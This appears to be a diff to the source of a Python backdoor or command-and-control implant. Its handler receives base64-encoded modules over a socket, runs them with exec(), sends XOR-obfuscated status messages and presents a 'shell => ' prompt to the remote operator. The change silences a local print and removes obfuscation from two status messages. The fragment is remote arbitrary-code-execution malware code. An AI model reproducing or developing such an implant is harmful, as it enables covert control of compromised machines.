@@ -86,7 +86,7 @@ def handler(connection):
             mod_data = ""                   # Our received file data will go here 
             data = connection.recv(socksize)
             mod_data += data
-            print("[+] Module recieved!")
+            #print("[+] Module recieved!")
             connection.send(xor("Complete", pin))     # sends OK msg to the client
             modexec = b64decode(mod_data)   # decode the received file
             module_handler(modexec, modname)            # send module to module_handler where it is executed and pipes data back to client
@@ -120,8 +120,8 @@ def accept():
 
 
 def module_handler(module, modname):
-    status_msg(xor("[+] Module: %s\n" % modname, pin))
-    status_msg(xor("[+] Start time: %s" % logtime, pin))
+    status_msg("[+] Module: %s\n" % modname)
+    status_msg("[+] Start time: %s" % logtime)
     exec(module)
     connection.send(xor("shell => ", pin))
 
